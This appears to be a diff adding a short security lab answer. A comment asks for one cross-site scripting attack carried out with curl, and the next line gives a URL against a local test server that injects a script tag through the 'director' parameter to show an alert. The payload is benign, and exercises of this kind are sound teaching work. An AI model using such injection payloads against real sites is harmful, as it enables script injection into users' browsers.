@@ -1,0 +1,4 @@
+#Directions: One attack, that exploits a XSS (cross-site scripting) vulnerability - this needs to conducted using 'curl'
+
+http://127.0.0.1:8000/gift?director=<script>alert("Congratulations! You Won!")</script>
+
